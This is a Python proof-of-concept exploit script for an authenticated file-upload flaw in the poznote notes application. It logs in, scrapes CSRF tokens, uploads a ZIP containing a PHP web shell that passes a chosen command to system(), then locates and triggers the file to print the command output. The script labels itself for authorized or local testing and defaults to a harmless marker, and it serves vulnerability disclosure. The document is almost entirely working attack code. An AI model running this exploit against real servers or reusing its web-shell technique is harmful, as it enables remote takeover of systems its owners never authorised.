#!/usr/bin/env python3
"""
poznote_rce_poc.py — PoC for the authenticated arbitrary-file-upload -> RCE in poznote.

Usage:
  python3 poznote_rce_poc.py --url http://localhost:8040 --username admin --password admin
  python3 poznote_rce_poc.py --url http://localhost:8040 --cmd id 
"""
import argparse
import http.cookiejar
import io
import os
import re
import sys
import uuid
import zipfile
import urllib.request
import urllib.parse
import urllib.error


def make_opener():
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    opener.addheaders = [("User-Agent", "poznote-rce-poc/1.0")]
    return opener, jar


def req(opener, method, url, data=None, headers=None):
    """Perform an HTTP request; return (status, body_bytes, resp_headers)."""
    body = None
    hdrs = dict(headers or {})
    if isinstance(data, dict):
        body = urllib.parse.urlencode(data).encode()
        hdrs.setdefault("Content-Type", "application/x-www-form-urlencoded")
    elif isinstance(data, (bytes, bytearray)):
        body = bytes(data)
    r = urllib.request.Request(url, data=body, method=method, headers=hdrs)
    try:
        resp = opener.open(r, timeout=20)
        return resp.getcode(), resp.read(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(), dict(e.headers)


def multipart(fields, files):
    """Build a multipart/form-data body. fields: {name:str}; files: {name:(filename,bytes)}."""
    boundary = "----poznotepoc" + uuid.uuid4().hex
    out = io.BytesIO()
    b = boundary.encode()
    for name, val in fields.items():
        out.write(b"--" + b + b"\r\n")
        out.write(f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode())
        out.write(str(val).encode() + b"\r\n")
    for name, (fname, content) in files.items():
        out.write(b"--" + b + b"\r\n")
        out.write(f'Content-Disposition: form-data; name="{name}"; filename="{fname}"\r\n'.encode())
        out.write(b"Content-Type: application/zip\r\n\r\n")
        out.write(content + b"\r\n")
    out.write(b"--" + b + b"--\r\n")
    return out.getvalue(), f"multipart/form-data; boundary={boundary}"


def step(n, msg):
    print(f"\n[{n}] {msg}")


def main():
    ap = argparse.ArgumentParser(description="poznote authenticated file-upload -> RCE PoC")
    ap.add_argument("--url", default="http://localhost:8040", help="base URL of the poznote instance")
    ap.add_argument("--username", default="admin")
    ap.add_argument("--password", default="admin")
    ap.add_argument("--cmd", default=None,
                    help="command to run on the target (authorized only). Default: benign marker, no command.")
    ap.add_argument("--max-id", type=int, default=20, help="highest user id to probe when locating the upload")
    args = ap.parse_args()
    base = args.url.rstrip("/")

    marker = "POZNOTE-RCE-POC-" + uuid.uuid4().hex
    shell_name = "poc_" + uuid.uuid4().hex[:8] + ".php"
    if args.cmd:
        php = f"<?php echo '{marker}:'; system({_php_str(args.cmd)}); ?>".encode()
    else:
        php = f"<?php echo '{marker}'; /* benign proof of code execution, no command run */ ?>".encode()

    print("=" * 70)
    print(" poznote authenticated file-upload -> RCE PoC — authorized/local testing only")
    print(f" target: {base}")
    print(f" payload file: {shell_name}  (marker {marker[:24]}…)")
    print("=" * 70)

    opener, _ = make_opener()

    # ---- 1) login ----------------------------------------------------------
    step(1, "Fetching login page + CSRF token")
    code, body, _ = req(opener, "GET", f"{base}/login.php")
    body_s = body.decode("utf-8", "replace")
    if code != 200:
        sys.exit(f"  ! GET /login.php returned {code}")
    m = re.search(r'name="csrf_token"\s+value="([^"]+)"', body_s)
    if not m:
        sys.exit("  ! could not find csrf_token on login page (already logged in? different version?)")
    csrf = m.group(1)
    print(f"  csrf_token = {csrf[:16]}…")

    step(2, f"Logging in as '{args.username}'")
    code, body, _ = req(opener, "POST", f"{base}/login.php",
                        data={"username": args.username, "password": args.password, "csrf_token": csrf})
    body_s = body.decode("utf-8", "replace")
    if 'name="password"' in body_s and ("Incorrect" in body_s or "invalid" in body_s.lower()):
        sys.exit("  ! login failed — wrong credentials?")
    print(f"  login response: HTTP {code} (session cookie set)")

    # ---- 3) scrape the restore_import CSRF token ---------------------------
    step(3, "Fetching /restore_import.php + scraping restore_import_csrf_token")
    code, body, _ = req(opener, "GET", f"{base}/restore_import.php")
    body_s = body.decode("utf-8", "replace")
    if code != 200:
        sys.exit(f"  ! GET /restore_import.php returned {code} (settings password set? not an account owner?)")
    m = re.search(r'name="csrf_token"\s+value="([^"]+)"', body_s)
    if not m:
        sys.exit("  ! could not find restore_import csrf_token (form not rendered)")
    rtoken = m.group(1)
    print(f"  restore_import_csrf_token = {rtoken[:16]}…")

    # ---- 4) build ZIP + upload as attachments ------------------------------
    step(4, f"Uploading attachments ZIP containing {shell_name}")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(shell_name, php)
    body_bytes, ctype = multipart(
        {"action": "import_attachments", "csrf_token": rtoken},
        {"attachments_file": ("attachments.zip", buf.getvalue())},
    )
    code, body, _ = req(opener, "POST", f"{base}/restore_import.php",
                        data=body_bytes, headers={"Content-Type": ctype})
    body_s = body.decode("utf-8", "replace")
    print(f"  upload response: HTTP {code}")
    if "error" in body_s.lower() and "imported" not in body_s.lower():
        # not necessarily fatal; some builds re-render the page — continue to probe
        snippet = re.sub(r"\s+", " ", body_s)[:200]
        print(f"  (server message: {snippet}…)")

    # ---- 5) locate + trigger -----------------------------------------------
    step(5, "Locating the uploaded file under /data/users/<id>/attachments/ and triggering it")
    anon, _ = make_opener()
    hit = None
    for uid in range(1, args.max_id + 1):
        url = f"{base}/data/users/{uid}/attachments/{shell_name}"
        suffix = "?c=" + urllib.parse.quote(args.cmd) if args.cmd else ""
        code, page, _ = req(anon, "GET", url + suffix)
        page_s = page.decode("utf-8", "replace")
        if marker in page_s:
            hit = (uid, url, page_s)
            break

    print("\n" + "=" * 70)
    if hit:
        uid, url, page_s = hit
        print(f" [VULNERABLE] uploaded PHP executed at: {url}")
        print(f"   user id = {uid}")
        if args.cmd:
            out = page_s.split(marker + ":", 1)[-1].strip()
            print(f"   command `{args.cmd}` output:\n   " + out.replace("\n", "\n   "))
        else:
            print("   marker echoed back => the uploaded .php was executed by PHP-FPM (RCE).")
            print("   re-run with --cmd id (authorized only) to demonstrate command execution.")
    else:
        print(" [not reproduced] marker not found on probed ids — patched, different storage path,")
        print(f"   nginx hardened, or user id > {args.max_id}. Try a higher --max-id.")
    print("=" * 70)


def _php_str(s):
    """Encode a python string as a single-quoted PHP string literal."""
    return "'" + s.replace("\\", "\\\\").replace("'", "\\'") + "'"


if __name__ == "__main__":
    main()
